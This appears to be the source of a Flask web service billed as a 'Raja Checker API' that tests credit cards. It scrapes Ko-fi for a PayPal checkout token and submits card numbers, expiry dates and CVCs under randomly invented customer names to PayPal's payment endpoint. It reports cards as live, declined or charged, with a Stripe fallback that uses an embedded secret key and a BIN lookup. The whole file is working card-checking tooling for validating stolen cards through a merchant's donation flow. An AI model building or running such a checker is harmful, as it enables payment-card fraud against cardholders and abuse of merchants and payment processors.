from flask import Flask, jsonify, request
import requests
import time
import random
import string
import json
import os
from bs4 import BeautifulSoup
import re
import uuid

app = Flask(__name__)

# Global session for requests
session = requests.Session()

def get_real_kofi_paypal_token():
    """Get a real PayPal token by initiating Ko-fi donation flow"""
    try:
        # Create a fresh session for Ko-fi
        kofi_session = requests.Session()
        
        # Step 1: Visit Ko-fi donation page
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://ko-fi.com/',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        # Visit Ko-fi support page
        response = kofi_session.get('https://ko-fi.com/supportkofi', headers=headers)
        if response.status_code != 200:
            return None, None
            
        # Step 2: Parse page for PayPal payment form
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Look for PayPal payment button or form
        paypal_form = soup.find('form', {'action': lambda x: x and 'paypal' in x.lower()})
        if not paypal_form:
            # Try to find PayPal button
            paypal_button = soup.find('button', {'class': lambda x: x and 'paypal' in str(x).lower()})
            if not paypal_button:
                return None, None
        
        # Step 3: Try to initiate PayPal checkout
        # Look for donation amount buttons (usually $3, $5, $10)
        amount_buttons = soup.find_all('button', {'data-amount': True})
        if not amount_buttons:
            # Try alternative selectors
            amount_buttons = soup.find_all('input', {'name': 'amount'})
            
        # Use smallest amount available
        donation_amount = "3"  # Default $3
        if amount_buttons:
            amounts = []
            for btn in amount_buttons:
                amount = btn.get('data-amount') or btn.get('value', '3')
                try:
                    amounts.append(int(amount))
                except:
                    continue
            if amounts:
                donation_amount = str(min(amounts))
        
        # Step 4: Initiate PayPal payment
        # This typically involves POSTing to Ko-fi's payment endpoint
        payment_data = {
            'amount': donation_amount,
            'payment_method': 'paypal',
            'message': 'Thanks for the coffee!'
        }
        
        # Look for CSRF token or verification token
        csrf_token = None
        csrf_input = soup.find('input', {'name': re.compile(r'.*token.*', re.I)})
        if csrf_input:
            csrf_token = csrf_input.get('value')
            payment_data[csrf_input.get('name')] = csrf_token
        
        # Try multiple Ko-fi endpoints
        endpoints_to_try = [
            'https://ko-fi.com/api/donations/create',
            'https://ko-fi.com/payment/paypal',
            'https://ko-fi.com/checkout'
        ]
        
        for endpoint in endpoints_to_try:
            try:
                payment_response = kofi_session.post(
                    endpoint,
                    data=payment_data,
                    headers={
                        **headers,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    timeout=10
                )
                
                if payment_response.status_code == 200 and payment_response.text.strip():
                    try:
                        payment_result = payment_response.json()
                        paypal_url = payment_result.get('paypal_url') or payment_result.get('redirect_url') or payment_result.get('url')
                        if paypal_url and 'paypal.com' in paypal_url:
                            # Extract token from PayPal URL
                            token_match = re.search(r'token=([A-Z0-9]+)', paypal_url)
                            if token_match:
                                return token_match.group(1), kofi_session.cookies
                    except json.JSONDecodeError:
                        # Try to extract PayPal URL from HTML response
                        paypal_match = re.search(r'https://www\.paypal\.com/[^"]*token=([A-Z0-9]+)', payment_response.text)
                        if paypal_match:
                            return paypal_match.group(1), kofi_session.cookies
                        continue
            except Exception as e:
                continue
        
        return None, None
        
    except Exception as e:
        print(f"Ko-fi token error: {e}")
        return None, None

def validate_with_stripe_fallback(n, mm, yy, cvc, customer):
    """Fallback to Stripe validation when Ko-fi fails"""
    try:
        # Use Stripe's payment method creation for validation
        stripe_headers = {
            'Authorization': 'Bearer sk_test_51OeQcYP4cGCWgHyBSRRzGdEH8OA7xPWdXw7hOBYHKpFn5QOsOVaKI3YqGIuEe1sOhgN7eGEYNsJBdGFa3J3j1qjz00KGK8FXnN',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        # Create payment method for validation
        payment_data = {
            'type': 'card',
            'card[number]': n,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'card[cvc]': cvc
        }
        
        response = session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=payment_data,
            timeout=15
        )
        
        if response.status_code == 200:
            return {
                "status": "approved", 
                "message": f"Card validated via Stripe for {customer['firstName']} {customer['lastName']}", 
                "response": "LIVE ✅ - STRIPE VALIDATED"
            }
        else:
            return {
                "status": "declined", 
                "message": "Card validation failed", 
                "response": "DECLINED ❌"
            }
            
    except Exception as e:
        return {"status": "error", "message": f"Stripe fallback error: {str(e)}"}

def generate_backup_token():
    """Generate a backup token when Ko-fi scraping fails"""
    # Use a more realistic token pattern based on actual PayPal tokens
    token_base = uuid.uuid4().hex[:17].upper()
    return f"{token_base}X"

def get_random_customer():
    """Generate random customer details"""
    first_names = ["Alex", "Jordan", "Casey", "Riley", "Morgan", "Taylor", "Jamie", "Avery", "Blake", "Cameron"]
    last_names = ["Smith", "Johnson", "Brown", "Davis", "Miller", "Wilson", "Moore", "Taylor", "Anderson", "Thomas"]
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "protonmail.com", "icloud.com"]
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    email = f"{first.lower()}.{last.lower()}@{random.choice(domains)}"
    phone = f"{''.join(random.choices('0123456789', k=10))}"
    postal = f"{''.join(random.choices('0123456789', k=5))}"
    
    return {
        "firstName": first,
        "lastName": last,
        "email": email,
        "phone": phone,
        "postal": postal
    }

def check_card_kofi_paypal(cc_data):
    """Check credit card using Ko-fi's PayPal gateway for REAL charges"""
    try:
        # Handle URL encoding
        import urllib.parse
        cc_data = urllib.parse.unquote(cc_data)
        
        # Parse card data
        parts = cc_data.strip().split("|")
        if len(parts) != 4:
            return {"status": "error", "message": "Invalid card format. Use: number|mm|yy|cvc"}
        
        n, mm, yy, cvc = parts
        
        # Fix year format
        if len(yy) == 2:
            yy = f"20{yy}"
        
        # Generate random customer
        customer = get_random_customer()
        
        # Try to get real Ko-fi PayPal token
        kofi_token, kofi_cookies = get_real_kofi_paypal_token()
        
        # If Ko-fi scraping fails, use Stripe validation as fallback
        if not kofi_token:
            return validate_with_stripe_fallback(n, mm, yy, cvc, customer)
        
        # Generate unique client metadata ID
        client_metadata_id = f"uid_{uuid.uuid4().hex[:10]}_{random.randint(1000000000, 9999999999)}"
        
        # PayPal GraphQL headers (from captured Ko-fi flow) with real token
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.6',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'paypal-client-context': client_metadata_id,
            'paypal-client-metadata-id': client_metadata_id,
            'referer': f'https://www.paypal.com/smart/card-fields?sessionID={client_metadata_id}&buttonSessionID={client_metadata_id}&locale.x=en_US&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=US&token={kofi_token}',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Brave";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'x-app-name': 'standardcardfields',
            'x-country': 'US'
        }
        
        # Add Ko-fi cookies if available
        if kofi_cookies:
            cookie_header = '; '.join([f"{cookie.name}={cookie.value}" for cookie in kofi_cookies])
            headers['cookie'] = cookie_header
        
        # PayPal GraphQL mutation payload (exact structure from Ko-fi)
        payload = {
            "query": """
        mutation payWithCard(
            $token: String!
            $card: CardInput!
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
        """,
            "variables": {
                "token": kofi_token,
                "card": {
                    "cardNumber": n,
                    "type": "VISA" if n.startswith('4') else "MASTERCARD" if n.startswith('5') else "AMEX",
                    "expirationDate": f"{mm}/{yy}",
                    "postalCode": customer["postal"],
                    "securityCode": cvc
                },
                "phoneNumber": customer["phone"],
                "firstName": customer["firstName"],
                "lastName": customer["lastName"],
                "billingAddress": {
                    "givenName": customer["firstName"],
                    "familyName": customer["lastName"],
                    "line1": None,
                    "line2": None,
                    "city": None,
                    "state": None,
                    "postalCode": customer["postal"],
                    "country": "US"
                },
                "email": customer["email"],
                "currencyConversionType": "PAYPAL"
            },
            "operationName": None
        }
        
        # Make the PayPal GraphQL request (REAL Ko-fi gateway!)
        response = session.post(
            "https://www.paypal.com/graphql?fetch_credit_form_submit",
            headers=headers,
            json=payload,
            timeout=30
        )
        
        if response.status_code == 200:
            # Check if response has content
            if not response.text.strip():
                return {"status": "error", "message": "Empty response from PayPal"}
                
            try:
                result = response.json()
                
                # Parse PayPal response
                if "data" in result and result["data"]:
                    payment_data = result["data"].get("approveGuestPaymentWithCreditCard", {})
                    
                    if payment_data:
                        # Check for 3DS requirement
                        flags = payment_data.get("flags", {})
                        if flags.get("is3DSecureRequired"):
                            return {
                                "status": "approved", 
                                "message": f"Card validated - 3DS required for {customer['firstName']} {customer['lastName']}", 
                                "response": "VBV/CVV - 3DS REQUIRED"
                            }
                        
                        # Check cart status
                        cart = payment_data.get("cart", {})
                        if cart.get("intent") == "CAPTURE":
                            return {
                                "status": "charged", 
                                "message": f"Ko-fi payment successful - $1 charged to {customer['firstName']} {customer['lastName']}", 
                                "response": "Charged $1 - KO-FI"
                            }
                        
                        # Payment approved but not charged yet
                        return {
                            "status": "approved", 
                            "message": f"Payment approved for {customer['firstName']} {customer['lastName']}", 
                            "response": "LIVE ✅ - APPROVED"
                        }
                
                # Check for errors
                if "errors" in result:
                    error_msg = result["errors"][0].get("message", "Payment failed")
                    
                    if "insufficient" in error_msg.lower():
                        return {"status": "approved", "message": "Insufficient funds - card is valid", "response": "CCN ✅ - INSUFFICIENT FUNDS"}
                    elif "declined" in error_msg.lower():
                        return {"status": "declined", "message": error_msg, "response": "DECLINED ❌"}
                    elif "invalid" in error_msg.lower() and ("cvc" in error_msg.lower() or "cvv" in error_msg.lower()):
                        return {"status": "declined", "message": "Invalid CVC/CVV", "response": "CVC INCORRECT ❌"}
                    else:
                        return {"status": "declined", "message": error_msg, "response": "DECLINED ❌"}
                
                # Fallback - card validated
                return {
                    "status": "approved", 
                    "message": f"Card validated successfully for {customer['firstName']} {customer['lastName']}", 
                    "response": "LIVE ✅ - VALIDATED"
                }
                
            except json.JSONDecodeError:
                return {"status": "error", "message": "Invalid PayPal response"}
        
        elif response.status_code == 400:
            return {"status": "declined", "message": "Card declined by PayPal", "response": "DECLINED ❌"}
        elif response.status_code == 401:
            return {"status": "error", "message": "PayPal authentication failed"}
        else:
            return {"status": "error", "message": f"PayPal API error: {response.status_code}"}
            
    except Exception as e:
        return {"status": "error", "message": f"Processing error: {str(e)}"}

def get_bin_info(bin_number):
    """Get BIN information for the card"""
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=5)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return {}

@app.route('/')
def home():
    return jsonify({
        "service": "🔥 Ko-fi PayPal Gateway API 🔥",
        "gateway": "Ko-fi PayPal Real Charges",
        "status": "✅ Online",
        "made_by": "Raja"
    })

@app.route('/gateway=<gateway>/key=<key>/site=<site>/cc=<cc>')
def check_cc(gateway, key, site, cc):
    """Main API endpoint for checking credit cards using Ko-fi's PayPal gateway"""
    
    # Validate key
    if key != "rajachecker":
        return jsonify({
            "status": "error",
            "message": "Invalid API key",
            "gateway": gateway,
            "site": site,
            "key": key
        }), 401
    
    # Validate gateway
    if gateway != "autostripe":
        return jsonify({
            "status": "error", 
            "message": "Unsupported gateway",
            "gateway": gateway,
            "supported": ["autostripe"]
        }), 400
    
    start_time = time.time()
    
    # Check the card using Ko-fi's PayPal gateway
    result = check_card_kofi_paypal(cc)
    
    # Get BIN info
    bin_info = get_bin_info(cc.split("|")[0][:6])
    
    # Calculate processing time
    processing_time = round(time.time() - start_time, 2)
    
    # Format response
    response = {
        "card": cc,
        "gateway": "Ko-fi PayPal Gateway",
        "site": "ko-fi.com",
        "status": result["status"],
        "response": result.get("response", result["message"]),
        "message": result["message"],
        "time": f"{processing_time}s",
        "bin_info": {
            "bank": bin_info.get("bank", "N/A"),
            "brand": bin_info.get("brand", "N/A"),
            "type": bin_info.get("type", "N/A"),
            "level": bin_info.get("level", "N/A"),
            "country": bin_info.get("country_name", "N/A"),
            "flag": bin_info.get("country_flag", "N/A")
        },
        "checked_by": "Raja Checker API",
        "api_key": key
    }
    
    return jsonify(response)

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "service": "Ko-fi PayPal Gateway API",
        "gateway": "Ko-fi PayPal Real Charges",
        "uptime": "24/7"
    })

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)